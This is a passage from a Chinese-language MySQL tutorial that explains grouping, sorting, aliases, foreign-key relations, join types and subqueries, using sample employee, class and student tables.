class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">values</span>(<span class="number">9</span>,<span class="string">&#x27;poik&#x27;</span>,<span class="number">3000</span>,<span class="number">1001</span>);</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>GROUP BY和聚合函数一起使用</p>
</li>
</ol>
<p>统计各部门员工个数 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*), departmentnumber <span class="keyword">from</span> employee <span class="keyword">group</span> <span class="keyword">by</span> departmentnumber;</span><br></pre></td></tr></table></figure>
<p>统计部门编号大于1001的各部门员工个数 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*), departmentnumber <span class="keyword">from</span> employee <span class="keyword">where</span> departmentnumber&gt;<span class="number">1001</span> <span class="keyword">group</span> <span class="keyword">by</span> departmentnumber;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p>GROUP BY和聚合函数HAVING一起使用</p>
</li>
</ol>
<p>统计工资总和大于8000的部门 MySQL命令：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(salary),departmentnumber <span class="keyword">from</span> employee <span class="keyword">group</span> <span class="keyword">by</span> departmentnumber <span class="keyword">having</span> <span class="built_in">sum</span>(salary)&gt;<span class="number">8000</span>;</span><br></pre></td></tr></table></figure>
<h3 id="使用ORDER-BY对查询结果排序">使用ORDER BY对查询结果排序</h3>
<p>从表中査询出来的数据可能是无序的或者其排列顺序不是我们期望的。为此，我们可以使用ORDER BY对查询结果进行排序。其语法格式如下所示：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段名<span class="number">1</span>,字段名<span class="number">2</span>,…</span><br><span class="line"><span class="keyword">FROM</span> 表名</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> 字段名<span class="number">1</span> [<span class="keyword">ASC</span> 丨 <span class="keyword">DESC</span>],字段名<span class="number">2</span> [<span class="keyword">ASC</span> | <span class="keyword">DESC</span>];</span><br></pre></td></tr></table></figure>
<p>在该语法中：字段名1、字段名2是查询结果排序的依据；参数 ASC表示按照升序排序，DESC表示按照降序排序；默认情况下，按照ASC方式排序。通常情况下，ORDER BY子句位于整个SELECT语句的末尾。</p>
<p>查询所有学生并按照年纪大小升序排列 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">order</span> <span class="keyword">by</span> age <span class="keyword">asc</span>;</span><br></pre></td></tr></table></figure>
<p>查询所有学生并按照年纪大小降序排列 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">order</span> <span class="keyword">by</span> age <span class="keyword">desc</span>;</span><br></pre></td></tr></table></figure>
<h2 id="别名设置">别名设置</h2>
<p>在査询数据时可为表和字段取別名，该别名代替表和字段的原名参与查询操作。</p>
<ol>
<li class="lvl-3">
<p>为表取名</p>
</li>
</ol>
<p>在查询操作时，假若表名很长使用起来就不太方便，此时可为表取一个別名，用该别名来代替表的名称。语法格式如下所示：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> 表名 [<span class="keyword">AS</span>] 表的别名 <span class="keyword">WHERE</span> .... ;</span><br></pre></td></tr></table></figure>
<p>将student改为stu查询整表 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">as</span> stu;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p>为字段取名</p>
</li>
</ol>
<p>在查询操作时，假若字段名很长使用起来就不太方便，此时可该字段取一个別名，用该别名来代替字段的名称。语法格式如下所示：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段名<span class="number">1</span> [<span class="keyword">AS</span>] 别名<span class="number">1</span> , 字段名<span class="number">2</span> [<span class="keyword">AS</span>] 别名<span class="number">2</span> , ... <span class="keyword">FROM</span> 表名 <span class="keyword">WHERE</span> ... ;</span><br></pre></td></tr></table></figure>
<p>将student中的name取别名为“姓名” 查询整表 MySQL命令：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="type">name</span> <span class="keyword">as</span> <span class="string">&#x27;姓名&#x27;</span>,id <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure>
<h2 id="表的关联关系">表的关联关系</h2>
<p>在实际开发中数据表之间存在着各种关联关系。在此，介绍MySQL中数据表的三种关联关系。多对一多对一(亦称为一对多)是数据表中最常见的一种关系。例如：员工与部门之间的关系，一个部门可以有多个员工；而一个员工不能属于多个部门只属于某个部门。在多对一的表关系 中，应将外键建在多的一方否则会造成数据的冗余。多对多多对多是数据表中常见的一种关系。例如：学生与老师之间的关系，一个学生可以有多个老师而且一个老师有多个学生。通常情况下，为了实现这种关系需要定义一张中间表(亦称为连接表)该表会存在两个外键分别参照老师表和学生表。一对一在开发过程中，一对一的关联关系在数据库中并不常见；因为以这种方式存储的信息通常会放在同一张表中。接下来，我们来学习在一对多的关联关系中如果添加和删除数据。先准备一些测试数据，代码如下：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> student;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="keyword">class</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建班级表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">class</span>(</span><br><span class="line">    cid <span class="type">int</span>(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY KEY</span>,</span><br><span class="line">    cname <span class="type">varchar</span>(<span class="number">30</span>) </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建学生表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> student(</span><br><span class="line">    sid <span class="type">int</span>(<span class="number">8</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY KEY</span>,</span><br><span class="line">    sname <span class="type">varchar</span>(<span class="number">30</span>),</span><br><span class="line">    classid <span class="type">int</span>(<span class="number">8</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 为学生表添加外键约束</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> student <span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> fk_student_classid <span class="keyword">FOREIGN KEY</span>(classid) <span class="keyword">REFERENCES</span> <span class="keyword">class</span>(cid);</span><br><span class="line"><span class="comment">-- 向班级表插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">class</span>(cid,cname)<span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">&#x27;Java&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">class</span>(cid,cname)<span class="keyword">VALUES</span>(<span class="number">2</span>,<span class="string">&#x27;Python&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 向学生表插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student(sid,sname,classid)<span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">&#x27;tome&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student(sid,sname,classid)<span class="keyword">VALUES</span>(<span class="number">2</span>,<span class="string">&#x27;lucy&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student(sid,sname,classid)<span class="keyword">VALUES</span>(<span class="number">3</span>,<span class="string">&#x27;lili&#x27;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student(sid,sname,classid)<span class="keyword">VALUES</span>(<span class="number">4</span>,<span class="string">&#x27;domi&#x27;</span>,<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>关联查询</p>
</li>
</ol>
<p>查询Java班的所有学生 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> classid=(<span class="keyword">select</span> cid <span class="keyword">from</span> <span class="keyword">class</span> <span class="title class_">where</span> cname=<span class="string">&#x27;Java&#x27;</span>);</span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p>关于关联关系的数据删除</p>
</li>
</ol>
<p>请从班级表中删除Java班级。在此，请注意：班级表和学生表之间存在关联关系；要删除Java班级，应该先删除学生表中与该班相关联的学生。否则，假若先删除Java班那么学生表中的cid就失去了关联</p>
<p>删除Java班 MySQL命令：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> from student where classid=(<span class="keyword">select</span> cid from <span class="class"><span class="keyword">class</span> <span class="title">where</span> <span class="title">cname</span>=&#x27;<span class="title">Java</span>&#x27;)</span>;</span><br><span class="line"><span class="keyword">delete</span> from <span class="class"><span class="keyword">class</span> <span class="title">where</span> <span class="title">cname</span>=&#x27;<span class="title">Java</span>&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h2 id="多表连接查询">多表连接查询</h2>
<h3 id="交叉连接查询">交叉连接查询</h3>
<p>交叉连接返回的结果是被连接的两个表中所有数据行的笛卡儿积；比如：集合A={a,b}，集合B={0,1,2}，则集合A和B的笛卡尔积为{(a,0),(a,1),(a,2),(b,0),(b,1),(b,2)}。所以，交叉连接也被称为笛卡尔连接，其语法格式如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> 表<span class="number">1</span> <span class="keyword">CROSS</span> <span class="keyword">JOIN</span> 表<span class="number">2</span>;</span><br></pre></td></tr></table></figure>
<p><font class="notice">注：在该语法中，CROSS JOIN用于连接两个要查询的表，通过该语句可以查询两个表中所有的数据组合。</font></p>
<p><strong>由于这个交叉连接查询在实际运用中没有任何意义，所以只做为了解即可</strong></p>
<h3 id="内链接查询">内链接查询</h3>
<p>内连接(Inner Join)又称简单连接或自然连接，是一种非常常见的连接查询。内连接使用比较运算符对两个表中的数据进行比较并列出与连接条件匹配的数据行，组合成新的 记录。也就是说在内连接查询中只有满足条件的记录才能出现在查询结果中。其语法格式如下：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 查询字段<span class="number">1</span>,查询字段<span class="number">2</span>, ... <span class="keyword">FROM</span> 表<span class="number">1</span> [<span class="keyword">INNER</span>] <span class="keyword">JOIN</span> 表<span class="number">2</span> <span class="keyword">ON</span> 表<span class="number">1.</span>关系字段=表<span class="number">2.</span>关系字段</span><br></pre></td></tr></table></figure>
<p>在该语法中：INNER JOIN用于连接两个表，ON来指定连接条件；其中INNER可以省略。</p>
<p>准备数据，代码如下：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 若存在数据库mydb则删除</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">DATABASE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> mydb;</span><br><span class="line"><span class="comment">-- 创建数据库mydb</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> mydb;</span><br><span class="line"><span class="comment">-- 选择数据库mydb</span></span><br><span class="line">USE mydb;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建部门表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> department(</span><br><span class="line">  did <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY KEY</span>, </span><br><span class="line">  dname <span class="type">varchar</span>(<span class="number">20</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建员工表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> employee (</span><br><span class="line">  eid <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY KEY</span>, </span><br><span class="line">  ename <span class="type">varchar</span> (<span class="number">20</span>), </span><br><span class="line">  eage <span class="type">int</span> (<span class="number">2</span>), </span><br><span class="line">  departmentid <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 向部门表插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> department <span class="keyword">VALUES</span>(<span class="number">1001</span>,<span class="string">&#x27;财务部&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> department <span class="keyword">VALUES</span>(<span class="number">1002</span>,<span class="string">&#x27;技术部&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> department <span class="keyword">VALUES</span>(<span class="number">1003</span>,<span class="string">&#x27;行政部&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> department <span class="keyword">VALUES</span>(<span class="number">1004</span>,<span class="string">&#x27;生活部&#x27;</span>);</span><br><span class="line"><span class="comment">-- 向员工表插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">&#x27;张三&#x27;</span>,<span class="number">19</span>,<span class="number">1003</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">VALUES</span>(<span class="number">2</span>,<span class="string">&#x27;李四&#x27;</span>,<span class="number">18</span>,<span class="number">1002</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">VALUES</span>(<span class="number">3</span>,<span class="string">&#x27;王五&#x27;</span>,<span class="number">20</span>,<span class="number">1001</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">VALUES</span>(<span class="number">4</span>,<span class="string">&#x27;赵六&#x27;</span>,<span class="number">20</span>,<span class="number">1004</span>);</span><br></pre></td></tr></table></figure>
<p>查询员工姓名及其所属部门名称 MySQL命令：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> employee.ename,department.dname <span class="keyword">from</span> department <span class="keyword">inner</span> <span class="keyword">join</span> employee <span class="keyword">on</span> department.did=employee.departmentid;</span><br></pre></td></tr></table></figure>
<h3 id="外连接查询">外连接查询</h3>
<p>在使用内连接查询时我们发现：返回的结果只包含符合查询条件和连接条件的数据。但是，有时还需要在返回查询结果中不仅包含符合条件的数据，而且还包括左表、右表或两个表中的所有数据，此时我们就需要使用外连接查询。外连接又分为左(外)连接和右(外)连接。其语法格式如下：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 查询字段<span class="number">1</span>,查询字段<span class="number">2</span>, ... <span class="keyword">FROM</span> 表<span class="number">1</span> <span class="keyword">LEFT</span> | <span class="keyword">RIGHT</span> [<span class="keyword">OUTER</span>] <span class="keyword">JOIN</span> 表<span class="number">2</span> <span class="keyword">ON</span> 表<span class="number">1.</span>关系字段=表<span class="number">2.</span>关系字段 <span class="keyword">WHERE</span> 条件</span><br></pre></td></tr></table></figure>
<p>由此可见，外连接的语法格式和内连接非常相似，只不过使用的是LEFT [OUTER] JOIN、RIGHT [OUTER] JOIN关键字。其中，关键字左边的表被称为左表，关键字右边的表被称为右表；OUTER可以省略。</p>
<p>在使用左(外)连接和右(外)连接查询时，查询结果是不一致的，具体如下：</p>
<p><strong>1、LEFT [OUTER] JOIN 左(外)连接：返回包括左表中的所有记录和右表中符合连接条件的记录。<br>
2、RIGHT [OUTER] JOIN 右(外)连接：返回包括右表中的所有记录和左表中符合连接条件的记录。</strong></p>
<p>先准备数据，代码如下：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 若存在数据库mydb则删除</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">DATABASE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> mydb;</span><br><span class="line"><span class="comment">-- 创建数据库mydb</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> mydb;</span><br><span class="line"><span class="comment">-- 选择数据库mydb</span></span><br><span class="line">USE mydb;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建班级表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">class</span>(</span><br><span class="line">  cid <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY KEY</span>, </span><br><span class="line">  cname <span class="type">varchar</span>(<span class="number">20</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建学生表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> student (</span><br><span class="line">  sid <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY KEY</span>, </span><br><span class="line">  sname <span class="type">varchar</span> (<span class="number">20</span>), </span><br><span class="line">  sage <span class="type">int</span> (<span class="number">2</span>), </span><br><span class="line">  classid <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">-- 向班级表插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">class</span> <span class="keyword">VALUES</span>(<span class="number">1001</span>,<span class="string">&#x27;Java&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">class</span> <span class="keyword">VALUES</span>(<span class="number">1002</span>,<span class="string">&#x27;C++&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">class</span> <span class="keyword">VALUES</span>(<span class="number">1003</span>,<span class="string">&#x27;Python&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">class</span> <span class="keyword">VALUES</span>(<span class="number">1004</span>,<span class="string">&#x27;PHP&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 向学生表插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">&#x27;张三&#x27;</span>,<span class="number">20</span>,<span class="number">1001</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">2</span>,<span class="string">&#x27;李四&#x27;</span>,<span class="number">21</span>,<span class="number">1002</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">3</span>,<span class="string">&#x27;王五&#x27;</span>,<span class="number">24</span>,<span class="number">1002</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">4</span>,<span class="string">&#x27;赵六&#x27;</span>,<span class="number">23</span>,<span class="number">1003</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">5</span>,<span class="string">&#x27;Jack&#x27;</span>,<span class="number">22</span>,<span class="number">1009</span>);</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>左（外）连接查询</p>
</li>
</ol>
<p>左(外)连接的结果包括LEFT JOIN子句中指定的左表的所有记录，以及所有满足连接条件的记录。如果左表的某条记录在右表中不存在则在右表中显示为空。</p>
<p>查询每个班的班级ID、班级名称及该班的所有学生的名字 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">class</span>.cid,<span class="keyword">class</span>.cname,student.sname <span class="keyword">from</span> <span class="keyword">class</span> <span class="title class_">left</span> <span class="keyword">outer</span> <span class="keyword">join</span> student on <span class="keyword">class</span>.cid=student.classid;</span><br></pre></td></tr></table></figure>
<p>运行效果展示</p>
<p><img src="/posts/c826a854//1aa93ef85390eaa0e11bbb16fefeedb6.png" alt="在这里插入图片描述"></p>
<p><font class="notice">展示结果分析：<br>
1、分别找出Java班、C++班、Python班的学生 <br>2、右表的Jack不满足查询条件故其没有出现在查询结果中 <br>3、虽然左表的PHP班没有学生，但是任然显示了PHP的信息；但是，它对应的学生名字为NULL</font></p>
<ol start="2">
<li class="lvl-3">
<p>右（外）连接查询</p>
</li>
</ol>
<p>右(外)连接的结果包括RIGHT JOIN子句中指定的右表的所有记录，以及所有满足连接条件的记录。如果右表的某条记录在左表中没有匹配，则左表将返回空值。</p>
<p>查询每个班的班级ID、班级名称及该班的所有学生的名字 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">class</span>.cid,<span class="keyword">class</span>.cname,student.sname <span class="keyword">from</span> <span class="keyword">class</span> <span class="title class_">right</span> <span class="keyword">outer</span> <span class="keyword">join</span> student on <span class="keyword">class</span>.cid=student.classid;</span><br></pre></td></tr></table></figure>
<p>运行效果展示</p>
<p><img src="/posts/c826a854//dd82b94cb3886aaa58c04a9cf89c38eb.png" alt="在这里插入图片描述"></p>
<p><font class="notice">展示结果分析：<br><br>
1、分别找出Java班、C++班、Python班的学生<br><br>
2、左表的PHP班不满足查询条件故其没有出现在查询结果中<br><br>
3、虽然右表的jack没有对应班级，但是任然显示王跃跃的信息；但是，它对应的班级以及班级编号均为NULL</font></p>
<h2 id="子查询">子查询</h2>
<p>子查询是指一个查询语句嵌套在另一个查询语句内部的查询；该查询语句可以嵌套在一个 SELECT、SELECT…INTO、INSERT…INTO等语句中。在执行查询时，首先会执行子查询中的语句，再将返回的结果作为外层查询的过滤条件。在子査询中通常可以使用比较运算符和IN、EXISTS、ANY、ALL等关键字。</p>
<p>准备数据，代码如下：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> student;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="keyword">class</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建班级表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">class</span>(</span><br><span class="line">  cid <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY KEY</span>, </span><br><span class="line">  cname <span class="type">varchar</span>(<span class="number">20</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建学生表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> student (</span><br><span class="line">  sid <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY KEY</span>, </span><br><span class="line">  sname <span class="type">varchar</span> (<span class="number">20</span>), </span><br><span class="line">  sage <span class="type">int</span> (<span class="number">2</span>), </span><br><span class="line">  classid <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 向班级表插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">class</span> <span class="keyword">VALUES</span>(<span class="number">1001</span>,<span class="string">&#x27;Java&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">class</span> <span class="keyword">VALUES</span>(<span class="number">1002</span>,<span class="string">&#x27;C++&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">class</span> <span class="keyword">VALUES</span>(<span class="number">1003</span>,<span class="string">&#x27;Python&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">class</span> <span class="keyword">VALUES</span>(<span class="number">1004</span>,<span class="string">&#x27;PHP&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">class</span> <span class="keyword">VALUES</span>(<span class="number">1005</span>,<span class="string">&#x27;Android&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 向学生表插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">&#x27;张三&#x27;</span>,<span class="number">20</span>,<span class="number">1001</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">2</span>,<span class="string">&#x27;李四&#x27;</span>,<span class="number">21</span>,<span class="number">1002</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">3</span>,<span class="string">&#x27;王五&#x27;</span>,<span class="number">24</span>,<span class="number">1003</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">4</span>,<span class="string">&#x27;赵六&#x27;</span>,<span class="number">23</span>,<span class="number">1004</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">5</span>,<span class="string">&#x27;小明&#x27;</span>,<span class="number">21</span>,<span class="number">1001</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">6</span>,<span class="string">&#x27;小红&#x27;</span>,<span class="number">26</span>,<span class="number">1001</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">7</span>,<span class="string">&#x27;小亮&#x27;</span>,<span class="number">27</span>,<span class="number">1002</span>);</span><br></pre></td></tr></table></figure>
<ol>
<li class="lvl-3">
<p>带比较运算符的查询</p>
</li>
</ol>
<p>比较运算符前面我们提到过得，就是&gt;、&lt;、=、&gt;=、&lt;=、!=等</p>
<p>查询张三同学所在班级的信息 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">class</span> <span class="title class_">where</span> cid=(<span class="keyword">select</span> classid <span class="keyword">from</span> student <span class="keyword">where</span> sname=<span class="string">&#x27;张三&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>查询比张三同学所在班级编号还大的班级的信息 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">class</span> <span class="title class_">where</span> cid&gt;(<span class="keyword">select</span> classid <span class="keyword">from</span> student <span class="keyword">where</span> sname=<span class="string">&#x27;张三&#x27;</span>);</span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p>带EXISTS关键字的查询</p>
</li>
</ol>
<p>EXISTS关键字后面的参数可以是任意一个子查询， 它不产生任何数据只返回TRUE或FALSE。当返回值为TRUE时外层查询才会 执行</p>
<p>假如王五同学在学生表中则从班级表查询所有班级信息 MySQL命令：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">class</span> <span class="title class_">where</span> <span class="keyword">exists</span> (<span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">where</span> sname=<span class="string">&#x27;王五&#x27;</span>);</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p>带ANY关键字的子查询</p>
</li>
</ol>
<p>ANY关键字表示满足其中任意一个条件就返回一个结果作为外层查询条件。</p>
<p>查询比任一学生所属班级号还大的班级编号 MySQL命令：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * from <span class="class"><span class="keyword">class</span> <span class="title">where</span> <span class="title">cid</span> &gt; <span class="title">any</span> (<span class="title">select</span> <span class="title">classid</span> <span class="title">from</span> <span class="title">student</span>)</span>;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li class="lvl-3">
<p>带ALL关键字的子查询</p>
</li>
</ol>
<p>ALL关键字与ANY有点类似，只不过带ALL关键字的子査询返回的结果需同时满足所有内层査询条件。</p>
<p>查询比所有学生所属班级号还大的班级编号 MySQL命令：</p>
